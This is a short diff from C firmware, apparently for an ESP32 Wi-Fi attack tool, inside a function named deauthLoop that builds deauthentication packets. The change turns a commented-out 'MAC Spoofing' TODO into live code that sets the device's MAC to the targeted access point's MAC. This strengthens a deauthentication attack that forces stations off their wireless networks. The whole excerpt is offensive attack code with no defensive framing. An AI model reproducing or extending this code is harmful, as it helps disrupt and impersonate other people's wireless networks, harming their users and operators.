@@ -132,10 +132,10 @@ void deauthLoop(void *pvParameter) {
                         memcpy(&deauth_pkt[DEAUTH_SRC_OFFSET], targetSTA[i]->apMac, 6);
                         memcpy(&deauth_pkt[DEAUTH_BSSID_OFFSET], targetSTA[i]->apMac, 6);
 //                        ESP_LOGI(DEAUTH_TAG, "Setting MAC: %02x:%02x:%02x:%02x:%02x:%02x",targetSTA[i]->apMac[0],targetSTA[i]->apMac[1],targetSTA[i]->apMac[2],targetSTA[i]->apMac[3],targetSTA[i]->apMac[4],targetSTA[i]->apMac[5]);
-// TODO: MAC Spoofing
-                        // if (esp_wifi_set_mac(WIFI_IF_AP, &(targetSTA[i]->apMac[0])) != ESP_OK) {
-                        //     ESP_LOGW(DEAUTH_TAG, "Setting MAC to %02x:%02x:%02x:%02x:%02x:%02x failed, oh well",targetSTA[i]->apMac[0],targetSTA[i]->apMac[1],targetSTA[i]->apMac[2],targetSTA[i]->apMac[3],targetSTA[i]->apMac[4],targetSTA[i]->apMac[5]);
-                        // }
+                        if (esp_wifi_set_mac(WIFI_IF_AP, &(targetSTA[i]->apMac[0])) != ESP_OK) {
+                            ESP_LOGW(DEAUTH_TAG, "Setting MAC to %02x:%02x:%02x:%02x:%02x:%02x failed, oh well",targetSTA[i]->apMac[0],targetSTA[i]->apMac[1],targetSTA[i]->apMac[2],targetSTA[i]->apMac[3],targetSTA[i]->apMac[4],targetSTA[i]->apMac[5]);
+                        }
+                        vTaskDelay(1);
                     } else {
                         #ifdef CONFIG_DEBUG_VERBOSE
                             printf("No AP info, not changing SRC from %02x:%02x:%02x:%02x:%02x:%02x\n",deauth_pkt[DEAUTH_SRC_OFFSET],deauth_pkt[DEAUTH_SRC_OFFSET+1],deauth_pkt[DEAUTH_SRC_OFFSET+2],deauth_pkt[DEAUTH_SRC_OFFSET+3],deauth_pkt[DEAUTH_SRC_OFFSET+4],deauth_pkt[DEAUTH_SRC_OFFSET+5]);
